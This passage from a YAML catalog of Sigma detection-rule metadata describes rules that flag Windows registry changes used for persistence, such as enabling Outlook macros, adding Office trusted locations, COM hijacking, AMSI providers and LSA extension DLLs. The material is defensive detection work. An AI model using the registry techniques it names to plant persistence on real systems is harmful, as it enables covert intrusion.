  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1008
  - T1137
  - T1546
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.command-and-control
  - attack.t1137
  - attack.t1008
  - attack.t1546
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=53
  - https://www.linkedin.com/pulse/outlook-backdoor-using-vba-samir-b-/
  false_positives:
  - Unknown
  notes: ''
- detection_id: e3b50fa5-3c3f-444e-937b-0a99d33731cd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_office_outlook_enable_macro_execution.yml
  name: Outlook Macro Execution Without Warning Setting Enabled
  description: Detects the modification of Outlook security setting to allow unprompted
    execution of macros.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1008
  - T1137
  - T1546
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.command-and-control
  - attack.t1137
  - attack.t1008
  - attack.t1546
  time_window: ''
  references:
  - https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/
  - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=53
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 6763c6c8-bd01-4687-bc8d-4fa52cf8ba08
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_office_outlook_enable_unsafe_client_mail_rules.yml
  name: Outlook EnableUnsafeClientMailRules Setting Enabled - Registry
  description: Detects an attacker trying to enable the outlook security setting "EnableUnsafeClientMailRules"
    which allows outlook to run applications or execute macros
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://support.microsoft.com/en-us/topic/how-to-control-the-rule-actions-to-start-an-application-or-run-a-macro-in-outlook-2016-and-outlook-2013-e4964b72-173c-959d-5d7b-ead562979048
  - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=44
  false_positives:
  - Unknown
  notes: ''
- detection_id: c3cefdf4-6703-4e1c-bad8-bf422fc5015a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_office_outlook_security_settings.yml
  name: Outlook Security Settings Updated - Registry
  description: Detects changes to the registry values related to outlook security
    settings
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1137
  tags:
  - attack.persistence
  - attack.t1137
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1137/T1137.md
  - https://learn.microsoft.com/en-us/outlook/troubleshoot/security/information-about-email-security-settings
  false_positives:
  - Administrative activity
  notes: ''
- detection_id: a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_office_trust_record_susp_location.yml
  name: Macro Enabled In A Potentially Suspicious Document
  description: Detects registry changes to Office trust records where the path is
    located in a potentially suspicious location
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://twitter.com/inversecos/status/1494174785621819397
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: f742bde7-9528-42e5-bd82-84f51a8387d2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_office_trusted_location_uncommon.yml
  name: Uncommon Microsoft Office Trusted Location Added
  description: Detects changes to registry keys related to "Trusted Location" of Microsoft
    Office where the path is set to something uncommon. Attackers might add additional
    trusted locations to avoid macro security restrictions.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - Internal Research
  - https://admx.help/?Category=Office2016&Policy=excel16.Office.Microsoft.Policies.Windows::L_TrustedLoc01
  false_positives:
  - Other unknown legitimate or custom paths need to be filtered to avoid false positives
  notes: ''
- detection_id: 91239011-fe3c-4b54-9f24-15c86bb65913
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_office_vba_warnings_tamper.yml
  name: Office Macros Warning Disabled
  description: Detects registry changes to Microsoft Office "VBAWarning" to a value
    of "1" which enables the execution of all macros, whether signed or unsigned.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://twitter.com/inversecos/status/1494174785621819397
  - https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/
  - https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 0e6a9e62-627e-496c-aef5-bfa39da29b5e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_optimize_file_sharing_network.yml
  name: MaxMpxCt Registry Value Changed
  description: 'Detects changes to the "MaxMpxCt" registry value.

    MaxMpxCt specifies the maximum outstanding network requests for the server per
    client, which is used when negotiating a Server Message Block (SMB) connection
    with a client. Note if the value is set beyond 125 older Windows 9x clients will
    fail to negotiate.

    Ransomware threat actors and operators (specifically BlackCat) were seen increasing
    this value in order to handle a higher volume of traffic.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1070.005
  tags:
  - attack.defense-evasion
  - attack.t1070.005
  time_window: ''
  references:
  - https://www.huntress.com/blog/blackcat-ransomware-affiliate-ttps
  - https://securityscorecard.com/research/deep-dive-into-alphv-blackcat-ransomware
  - https://www.intrinsec.com/alphv-ransomware-gang-analysis/?cn-reloaded=1
  - https://www.sentinelone.com/labs/blackcat-ransomware-highly-configurable-rust-driven-raas-on-the-prowl-for-victims/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 33efc23c-6ea2-4503-8cfe-bdf82ce8f705
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_amsi_providers.yml
  name: Potential Persistence Via New AMSI Providers - Registry
  description: 'Detects when an attacker adds a new AMSI provider via the Windows
    Registry to bypass AMSI (Antimalware Scan Interface) protections.

    Attackers may add custom AMSI providers to persist on the system and evade detection
    by security software that relies on AMSI for scanning scripts and other content.

    This technique is often used in conjunction with fileless malware and script-based
    attacks to maintain persistence while avoiding detection.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://persistence-info.github.io/Data/amsi.html
  - https://github.com/gtworek/PSBits/blob/8d767892f3b17eefa4d0668f5d2df78e844f01d8/FakeAMSI/FakeAMSI.c
  false_positives:
  - Legitimate security products adding their own AMSI providers. Filter these according
    to your environment.
  notes: ''
- detection_id: b86852fb-4c77-48f9-8519-eb1b2c308b59
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_app_cpmpat_layer_registerapprestart.yml
  name: Potential Persistence Via AppCompat RegisterAppRestart Layer
  description: 'Detects the setting of the REGISTERAPPRESTART compatibility layer
    on an application.

    This compatibility layer allows an application to register for restart using the
    "RegisterApplicationRestart" API.

    This can be potentially abused as a persistence mechanism.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.011
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.011
  time_window: ''
  references:
  - https://github.com/nasbench/Misc-Research/blob/d114d6a5e0a437d3818e492ef9864367152543e7/Other/Persistence-Via-RegisterAppRestart-Shim.md
  false_positives:
  - Legitimate applications making use of this feature for compatibility reasons
  notes: ''
- detection_id: 707e097c-e20f-4f67-8807-1f72ff4500d6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_app_paths.yml
  name: Potential Persistence Via App Paths Default Property
  description: 'Detects changes to the "Default" property for keys located in the
    \Software\Microsoft\Windows\CurrentVersion\App Paths\ registry. Which might be
    used as a method of persistence

    The entries found under App Paths are used primarily for the following purposes.

    First, to map an application''s executable file name to that file''s fully qualified
    path.

    Second, to prepend information to the PATH environment variable on a per-application,
    per-process basis.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.012
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.012
  time_window: ''
  references:
  - https://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/
  - https://learn.microsoft.com/en-us/windows/win32/shell/app-registration
  false_positives:
  - Legitimate applications registering their binary from on of the suspicious locations
    mentioned above (tune it)
  notes: ''
- detection_id: df4dc653-1029-47ba-8231-3c44238cc0ae
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_appx_debugger.yml
  name: Potential Persistence Using DebugPath
  description: Detects potential persistence using Appx DebugPath
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.015
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.015
  time_window: ''
  references:
  - https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/
  - https://github.com/rootm0s/WinPwnage
  false_positives:
  - Unknown
  notes: ''
- detection_id: e6fe26ee-d063-4f5b-b007-39e90aaf50e3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_autodial_dll.yml
  name: Potential Persistence Via AutodialDLL
  description: Detects change the the "AutodialDLL" key which could be used as a persistence
    method to load custom DLL via the "ws2_32" library
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://www.hexacorn.com/blog/2015/01/13/beyond-good-ol-run-key-part-24/
  - https://persistence-info.github.io/Data/autodialdll.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 976dd1f2-a484-45ec-aa1d-0e87e882262b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_chm.yml
  name: Potential Persistence Via CHM Helper DLL
  description: Detects when an attacker modifies the registry key "HtmlHelp Author"
    to achieve persistence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://persistence-info.github.io/Data/htmlhelpauthor.html
  - https://www.hexacorn.com/blog/2018/04/22/beyond-good-ol-run-key-part-76/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 790317c0-0a36-4a6a-a105-6e576bf99a14
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_com_hijacking_builtin.yml
  name: COM Object Hijacking Via Modification Of Default System CLSID Default Value
  description: Detects potential COM object hijacking via modification of default
    system CLSID.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.015
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.015
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2022/07/27/untangling-knotweed-european-private-sector-offensive-actor-using-0-day-exploits/
    (idea)
  - https://unit42.paloaltonetworks.com/snipbot-romcom-malware-variant/
  - https://blog.talosintelligence.com/uat-5647-romcom/
  - https://global.ptsecurity.com/analytics/pt-esc-threat-intelligence/darkhotel-a-cluster-of-groups-united-by-common-techniques
  - https://threatbook.io/blog/Analysis-of-APT-C-60-Attack-on-South-Korea
  - https://catalyst.prodaft.com/public/report/inside-the-latest-espionage-campaign-of-nebulous-mantis
  - https://github.com/rtecCyberSec/BitlockMove
  - https://cert.gov.ua/article/6284080
  - https://securelist.com/forumtroll-apt-hacking-team-dante-spyware/117851/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9b0f8a61-91b2-464f-aceb-0527e0a45020
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_com_key_linking.yml
  name: Potential COM Object Hijacking Via TreatAs Subkey - Registry
  description: Detects COM object hijacking via TreatAs subkey
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.015
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.015
  time_window: ''
  references:
  - https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/
  false_positives:
  - Maybe some system utilities in rare cases use linking keys for backward compatibility
  notes: ''
- detection_id: 243380fa-11eb-4141-af92-e14925e77c1b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_comhijack_psfactorybuffer.yml
  name: Potential PSFactoryBuffer COM Hijacking
  description: Detects changes to the PSFactory COM InProcServer32 registry. This
    technique was used by RomCom to create persistence storing a malicious DLL.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.015
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.015
  time_window: ''
  references:
  - https://blogs.blackberry.com/en/2023/06/romcom-resurfaces-targeting-ukraine
  - https://strontic.github.io/xcyclopedia/library/clsid_C90250F3-4D7D-4991-9B69-A5C5BC1C2AE6.html
  - https://www.virustotal.com/gui/file/6d3ab9e729bb03ae8ae3fcd824474c5052a165de6cb4c27334969a542c7b261d/detection
  - https://www.trendmicro.com/en_us/research/23/e/void-rabisu-s-use-of-romcom-backdoor-shows-a-growing-shift-in-th.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: fdbf0b9d-0182-4c43-893b-a1eaab92d085
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_custom_protocol_handler.yml
  name: Potential Persistence Via Custom Protocol Handler
  description: Detects potential persistence activity via the registering of a new
    custom protocole handlers. While legitimate applications register protocole handlers
    often times during installation. And attacker can abuse this by setting a custom
    handler to be used as a persistence mechanism.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://ladydebug.com/blog/2019/06/21/custom-protocol-handler-cph/
  false_positives:
  - Many legitimate applications can register a new custom protocol handler. Additional
    filters needs to applied according to your environment.
  notes: ''
- detection_id: a1e11042-a74a-46e6-b07c-c4ce8ecc239b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_event_viewer_events_asp.yml
  name: Potential Persistence Via Event Viewer Events.asp
  description: Detects potential registry persistence technique using the Event Viewer
    "Events.asp" technique
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://twitter.com/nas_bench/status/1626648985824788480
  - https://admx.help/?Category=Windows_7_2008R2&Policy=Microsoft.Policies.InternetCommunicationManagement::EventViewer_DisableLinks
  - https://www.hexacorn.com/blog/2019/02/15/beyond-good-ol-run-key-part-103/
  - https://github.com/redcanaryco/atomic-red-team/blob/f296668303c29d3f4c07e42bdd2b28d8dd6625f9/atomics/T1112/T1112.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 36803969-5421-41ec-b92f-8500f79c23b0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_globalflags.yml
  name: Potential Persistence Via GlobalFlags
  description: Detects registry persistence technique using the GlobalFlags and SilentProcessExit
    keys
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.012
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1546.012
  - car.2013-01-002
  time_window: ''
  references:
  - https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/
  - https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/
  false_positives:
  - Unknown
  notes: ''
- detection_id: d88d0ab2-e696-4d40-a2ed-9790064e66b3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_ie.yml
  name: Modification of IE Registry Settings
  description: Detects modification of the registry settings used for Internet Explorer
    and other Windows components that use these settings. An attacker can abuse this
    registry key to add a domain to the trusted sites Zone or insert JavaScript for
    persistence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: low
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1112/T1112.md#atomic-test-4---add-domain-to-trusted-sites-zone
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1112/T1112.md#atomic-test-5---javascript-in-registry
  false_positives:
  - Unknown
  notes: ''
- detection_id: b23818c7-e575-4d13-8012-332075ec0a2b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_ifilter.yml
  name: Register New IFiltre For Persistence
  description: 'Detects when an attacker registers a new IFilter for an extension.
    Microsoft Windows Search uses filters to extract the content of items for inclusion
    in a full-text index.

    You can extend Windows Search to index new or proprietary file types by writing
    filters to extract the content, and property handlers to extract the properties
    of files.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://persistence-info.github.io/Data/ifilters.html
  - https://twitter.com/0gtweet/status/1468548924600459267
  - https://github.com/gtworek/PSBits/tree/master/IFilter
  - https://github.com/gtworek/PSBits/blob/8d767892f3b17eefa4d0668f5d2df78e844f01d8/IFilter/Dll.cpp#L281-L308
  false_positives:
  - Legitimate registration of IFilters by the OS or software
  notes: ''
- detection_id: 9ace0707-b560-49b8-b6ca-5148b42f39fb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_logon_scripts_userinitmprlogonscript.yml
  name: Potential Persistence Via Logon Scripts - Registry
  description: Detects creation of "UserInitMprLogonScript" registry value which can
    be used as a persistence method by malicious actors
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1037.001
  tags:
  - attack.privilege-escalation
  - attack.t1037.001
  - attack.persistence
  - attack.lateral-movement
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1037.001/T1037.001.md
  false_positives:
  - Investigate the contents of the "UserInitMprLogonScript" value to determine of
    the added script is legitimate
  notes: ''
- detection_id: 41f6531d-af6e-4c6e-918f-b946f2b85a36
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_lsa_extension.yml
  name: Potential Persistence Via LSA Extensions
  description: 'Detects when an attacker modifies the "REG_MULTI_SZ" value named "Extensions"
    to include a custom DLL to achieve persistence via lsass.

    The "Extensions" list contains filenames of DLLs being automatically loaded by
    lsass.exe. Each DLL has its InitializeLsaExtension() method called after loading.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://persistence-info.github.io/Data/lsaaextension.html
  - https://twitter.com/0gtweet/status/1476286368385019906
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 92772523-d9c1-4c93-9547-b0ca500baba3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_mpnotify.yml
  name: Potential Persistence Via Mpnotify
  description: Detects when an attacker register a new SIP provider for persistence
    and defense evasion
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://persistence-info.github.io/Data/mpnotify.html
  - https://www.youtube.com/watch?v=ggY3srD9dYs&ab_channel=GrzegorzTworek
  false_positives:
  - Might trigger if a legitimate new SIP provider is registered. But this is not
    a common occurrence in an environment and should be investigated either way
  notes: ''
- detection_id: 8fbe98a8-8f9d-44f8-aa71-8c572e29ef06
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_mycomputer.yml
  name: Potential Persistence Via MyComputer Registry Keys
  description: Detects modification to the "Default" value of the "MyComputer" key
    and subkeys to point to a custom binary that will be launched whenever the associated
    action is executed (see reference section for example)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://www.hexacorn.com/blog/2017/01/18/beyond-good-ol-run-key-part-55/
  false_positives:
  - Unlikely but if you experience FPs add specific processes and locations you would
    like to monitor for
  notes: ''
- detection_id: a1b1fd53-9c4a-444c-bae0-34a330fc7aa8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_natural_language.yml
  name: Potential Persistence Via DLLPathOverride
  description: Detects when an attacker adds a new "DLLPathOverride" value to the
    "Natural Language" key in order to achieve persistence which will get invoked
    by "SearchIndexer.exe" process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://persistence-info.github.io/Data/naturallanguage6.html
  - https://www.hexacorn.com/blog/2018/12/30/beyond-good-ol-run-key-part-98/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9d15044a-7cfe-4d23-8085-6ebc11df7685
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_office_vsto.yml
  name: Potential Persistence Via Visual Studio Tools for Office
  description: Detects persistence via Visual Studio Tools for Office (VSTO) add-ins
    in Office applications.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1137.006
  tags:
  - attack.t1137.006
  - attack.persistence
  time_window: ''
  references:
  - https://twitter.com/_vivami/status/1347925307643355138
  - https://vanmieghem.io/stealth-outlook-persistence/
  false_positives:
  - Legitimate Addin Installation
  notes: ''
- detection_id: ddd171b5-2cc6-4975-9e78-f0eccd08cc76
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_outlook_homepage.yml
  name: Potential Persistence Via Outlook Home Page
  description: 'Detects potential persistence activity via outlook home page.

    An attacker can set a home page to achieve code execution and persistence by editing
    the WebView registry keys.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1112
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=70
  - https://support.microsoft.com/en-us/topic/outlook-home-page-feature-is-missing-in-folder-properties-d207edb7-aa02-46c5-b608-5d9dbed9bd04?ui=en-us&rs=en-us&ad=us
  - https://trustedsec.com/blog/specula-turning-outlook-into-a-c2-with-one-registry-change
  false_positives:
  - Unknown
  notes: ''
- detection_id: 487bb375-12ef-41f6-baae-c6a1572b4dd1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_outlook_todaypage.yml
  name: Potential Persistence Via Outlook Today Page
  description: 'Detects potential persistence activity via outlook today page.

    An attacker can set a custom page to execute arbitrary code and link to it via
    the registry values "URL" and "UserDefinedUrl".

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1112
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=74
